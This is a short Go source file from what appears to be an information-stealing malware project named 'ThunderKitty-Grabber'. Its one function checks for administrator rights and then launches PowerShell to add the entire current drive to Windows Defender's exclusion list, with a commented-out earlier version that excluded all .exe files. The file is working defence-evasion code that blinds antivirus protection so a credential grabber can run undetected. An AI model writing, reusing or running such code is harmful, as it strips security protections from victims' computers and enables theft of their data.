package Exclude

import (
	Persistence "ThunderKitty-Grabber/utils/persistence"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

func ExcludeDrive() {
	if !Persistence.IsAdmin() {
		return
	}
	dir, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
		return
	}

	vol := filepath.VolumeName(dir)

	// Legacy code
	//wdsmd := `powershell -Command "Set-MpPreference -ExclusionExtension *.exe -Force"`
	//line, _ := syscall.UTF16PtrFromString(wdsmd)

	wdsmd := fmt.Sprintf(`powershell -C "Add-MpPreference -ExclusionPath '%v'"`, vol)
	line, _ := syscall.UTF16PtrFromString(wdsmd)

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	syscall.CreateProcess(nil, line, nil, nil, false, 0, nil, nil, &si, &pi)
	syscall.WaitForSingleObject(pi.Process, syscall.INFINITE)
	syscall.CloseHandle(pi.Process)
	syscall.CloseHandle(pi.Thread)
}
